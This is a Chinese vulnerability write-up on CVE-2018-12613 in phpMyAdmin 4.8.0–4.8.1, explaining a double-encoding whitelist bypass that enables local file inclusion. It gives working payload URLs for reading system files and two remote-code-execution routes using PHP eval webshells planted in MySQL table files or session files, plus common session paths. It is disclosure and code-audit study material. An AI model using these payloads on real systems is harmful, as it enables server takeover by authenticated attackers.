# 一、前言

这篇文章的出发点是在做渗透的过程中，如果遇到phpMyAdmin4.8.x，不需要再像常规那样有file权限才能REC，这里只要结合后台本地文件包含和insert权限或select权限就可以RCE。虽然这是一个需要后台登陆才能利用的漏洞，但是这个漏洞的绕过方式可以作为一个经典的代码审计案例来学习。本文先介绍了如何绕过白名单实现本地文件包含，然后又介绍了如何结合insert权限或select权限获取到RCE。

# 二、漏洞介绍

phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。

## 2.1漏洞描述

在phpMyadmin 4.8.x版本中，程序没有严格控制用户的输入，攻击者可以利用双重编码绕过程序的白名单限制，造成LFI漏洞。

## 2.2受影响的系统版本

phpMyadmin 4.8.0

phpMyadmin 4.8.1

## 2.3.漏洞编号

CVE-2018-12613

# 三、漏洞细节

在/index.php 56行：

  

![image.png](https://image.3001.net/images/20180628/15301768974473.png!small)

这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。

首先，我们满足4个条件：

1．传入的target 需要是一个字符串。

2．不能以/index/ 开头。

3．不能在$target_blacklist 数组内。

![image.png](https://image.3001.net/images/20180628/15301780957068.png!small)

4．满足checkPageValidity函数要求。

跟踪一下checkPageValidity函数

在/libraries/classes/Core.php 443行:

![image.png](https://image.3001.net/images/20180628/15301769423297.png!small)

该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。

![image.png](https://image.3001.net/images/20180628/15301769559272.png!small)

我们先看第一个返回true的地方。

![image.png](https://image.3001.net/images/20180628/15301769633339.png!small)  

这里的$page在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。

再来看第二个

![image.png](https://image.3001.net/images/20180628/15301769777010.png!small)

先介绍下这些函数的作用：

mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。

mb_substr()函数的意思是：

string mb_substr ( string $str, int $start [, int $length = NULL [, string
$encoding = mb_internal_encoding()]] )

从$str字符串中，提取从$start位置开始，长度为$length的字符串。

可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？

假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。

![image.png](https://image.3001.net/images/20180628/15301769879264.png!small)

那这里就是 include ‘db_sql.php?/../../../aaa.txt’。

这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。

再来看第三个：

![image.png](https://image.3001.net/images/20180628/15301769968570.png!small)

第三个和第二个对比多出了个urldecode()函数。

而问题恰恰出在了这个urldecode()函数。

我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。

原因是：

%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。

这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。

include db_sql.php%3f/../../../aaa.txt

# 四、漏洞利用

4.1包含本地系统文件

Payload:

/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini

![image.png](https://image.3001.net/images/20180628/15301771186336.png!small)  

4.2命令执行

这里有两种姿势可以造成RCE。

4.2.1利用mysql的data文件：

创建一个名为abc的表，并且字段设置为<?php eval($_GET[‘z’]); ?> 。

![image.png](https://image.3001.net/images/20180628/15301771286232.png!small)

保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。

如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。

show variables like '%datadir%';

![image.png](https://image.3001.net/images/20180628/15301771351835.png!small)

  

![image.png](https://image.3001.net/images/20180628/15301771426487.png!small)

其中，abc.frm文件内容

![image.png](https://image.3001.net/images/20180628/15301771829422.png!small)  

Payload：

/index.php?z=phpinfo();⌖=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/MySQL/data/test/abc.frm

![image.png](https://image.3001.net/images/20180628/1530177191795.png!small)  

  

4.2.2利用PHP session序列化数据：

这个方法的原理是：每次我们登录phpmyadmin的时候，系统就会产生一个sess_sessionID文件，然后在里面执行的操作，会被记录到这个文件内。

![image.png](https://image.3001.net/images/20180628/15301771999963.png!small)

首先，打开sql查询，执行sql语句SELECT '<?php eval($_GET[z]); exit();?>'。

![image.png](https://image.3001.net/images/20180628/153017720671.png!small)

然后打开控制台。获取自己的sessionID。

![image.png](https://image.3001.net/images/20180628/15301772135608.png!small)

然后对应的文件就是sess_sessionID。我这里对应的文件名就是sess_16rme70p2qqnqjnhdiq3i6unu28bpqaa

获取到sessionID文件，接下来就是包含利用了，这需要知道sessionID文件的路径。对于sessionID文件的路径，每种环境搭建方式的不同，路径也会不同。所以，这里提供几个常见的路径。

sessionID文件常见路径：

在Linux下，常见的文件路径为： /var/lib/php/session/

在Windows下：

phpstudy集成软件环境下，文件路径为：

/phpstudy/PHPTutorial/tmp/tmp

Wamp集成软件环境下，文件路径为：

/wamp64/tmp

这个方法相对于第一种比较不稳定，因为环境搭建方式的不同，session文件的路径也会不同，并且对于攻击者session文件的绝对路径也是不能直接获取到的，只能靠常见路径或猜路径去利用。

我这里用的是phpstudy环境。

![image.png](https://image.3001.net/images/20180628/15301772225464.png!small)

文件内容：

![image.png](https://image.3001.net/images/20180628/15301772279587.png!small)

Payload:

/index.php?z=phpinfo();⌖=sql.php%253f/../../../tmp/tmp/sess_16rme70p2qqnqjnhdiq3i6unu28bpqaa

![image.png](https://image.3001.net/images/20180628/15301772372477.png!small)

  

# 五、修复建议

目前官方已修复该漏洞，发布了最新版本4.8.2，可从官网下载最新版本。

下载链接：<https://www.phpmyadmin.net/news/2018/6/21/security-fix-phpmyadmin-482-released/>

